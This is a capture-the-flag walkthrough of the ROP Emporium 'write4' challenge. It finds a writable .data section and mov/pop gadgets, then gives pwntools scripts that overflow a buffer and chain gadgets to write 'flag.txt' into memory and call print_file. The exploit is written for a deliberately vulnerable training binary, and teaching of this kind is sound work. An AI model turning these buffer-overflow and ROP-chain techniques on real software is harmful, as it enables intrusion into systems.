# WRITE4

[write4](https://ropemporium.com/challenge/write4.html)

As the author wrote under the title of the challenge's article,
solving `write4` will require *"proper gadget use"*. This is also the challenge where we can use ROPgadget's ropchain feature to create gadget chains for us to write a string into memory.

Based on what was written in the challenge article, we need to somehow call the `print_file()` function with one argument: the path to the flag (relative or absolute, doesn't matter). Easy right? Just find a stray string that says "flag.txt" using `rabin2` and...

```
$ rabin2 -z ./write4                          
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b4 0x004006b4 11  12   .rodata ascii nonexistent
```

...nothing.

Since we don't have any random strings in the binary that we can piggyback off of, we have to create our own "flag.txt" and copy it to somewhere we know we can find it.

So where can we put our string? Let's have a look at the available sections in the `write4` binary. We need a section that we can write our string to, so look out for a section with "w" under the "perm" column.

```
$ rabin2 -S ./write4
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- 
1   0x00000238   0x1c 0x00400238   0x1c -r-- .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
25  0x00001038   0x29 0x00000000   0x29 ---- .comment
26  0x00001068  0x618 0x00000000  0x618 ---- .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- .shstrtab
```

From what we know about a layout of an x86 binary, there are 3 main sections we should care about: `.text`, `.data` and `.bss`. The `.text` section is where all of our executable code is found and is not writeable while the `.data` and `.bss` sections contain global variables that the program can use. From what we can see in the output of `rabin2 -S ./write4`, we know we can write to either `.data` or `.bss`. Since `.data` contains pre-initialised data and is larger (at 0x10 or 16 bytes), we will write our string to `.data` instead of `.bss` to guarantee our exploit will work.

Now that we know where to copy our string to, we have to figure our how to copy our string to `.data`. ROP Emporium has provided us with a useful hint: `mov [reg], reg`. If we can find a gadget like this, we can copy the contents of one register to the location pointed to by another register.

Let's employ `ROPgadget` to find our gadget. If we scroll down all the way to the end, this is what we see.

```
$ ROPgadget --binary ./write4 --ropchain
...
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x400628 mov qword ptr [r14], r15 ; ret
        [+] Gadget found: 0x400690 pop r14 ; pop r15 ; ret
        [+] Gadget found: 0x400692 pop r15 ; ret
        [-] Can't find the 'xor r15, r15' gadget. Try with another 'mov [reg], reg'

        [-] Can't find the 'mov qword ptr [r64], r64' gadget
```

We've found 2 useful gadgets:

```
0x400628 : mov [r14], r15 ; ret
0x400690 : pop r14 ; pop r15 ; ret
```

The first gadget allows us to copy the contents of `r15` to the location pointed to by `r14` while the second gadget allows us to copy the contents of the stack to `r14` and `r15` respectively. Can you see how we can create an ROP chain now?

In x86_64, each register is 64 bits wide, or 8 bytes, which means that we can copy 8 bytes one by one using the `mov [r14], r15 ; ret` gadget. Since "flag.txt" is 8 bytes long, we only need one copy to write our string into `.data`.

```python
# ./win.py
from pwn import *
...
attack = b"A"*0x28
# copy location of .data and flag.txt to r14 and r15 respectively
attack += p64(0x400690) + p64(0x601028) + b"flag.txt"
# copy r15 to .data
attack += p64(0x400628)
# call print_file with the location of .data as the first argument
# you should be able to find the appropriate gadgets and functions
# yourself using ROPgadget and rabin2 yourself
attack += p64(0x400693) # pop rdi ; ret
attack += p64(0x601028) # .data
attack += p64(0x4004e6) # ret
attack += p64(0x400510) # print_file
io.sendline(attack)
...
```

If you run this script, the program should happily print out the flag for you because in `write4`, .data` is filled with `0`s when we sent our buffer overflow attack.

If `.data` was filled with actual data (like in real-world programs), it would be unlikely that `.data` would be just zeroes when we sent our attack. Remember that in code generated by (relatively) low-level languages like C and C++, strings must be null-terminated. If we had blindly copied "flag.txt" to `.data`, it wouldn't be properly null-terminated and the string we pass to `print_file` would most likely be a garbled mess like "flag.txt7987y894yu9r834y8fue...".

How do we prevent this? Simple! We create our own null-terminator and copy it to the location after "flag.txt". The procedure is the same as copying "flag.txt", just that we have to make sure that r14 contains the location of `.data` plus an extra 8 bytes so that we don't overwrite "flag.txt".

```python
# ./win.py
from pwn import *
...
attack = b"A"*0x28

# copy location of .data and flag.txt to r14 and r15 respectively
attack += p64(0x400690) + p64(0x601028) + b"flag.txt"
# copy r15 to .data
attack += p64(0x400628)

# copy location of .data + 8 to r14 and null-terminator to r15
# make sure r15 is 8 bytes long
# you can do this by multiplying the null byte "\x00" by 8
attack += p64(0x400690) + p64(0x601028+8) + b"\x00"*8
# copy r15 to .data+8
attack += p64(0x400628)

# call print_file with the location of .data as the first argument
# you should be able to find the appropriate gadgets and functions
# yourself using ROPgadget and rabin2 yourself
attack += p64(0x400693) # pop rdi ; ret
attack += p64(0x601028) # .data
attack += p64(0x4004e6) # ret
attack += p64(0x400510) # print_file

io.sendline(attack)
...
```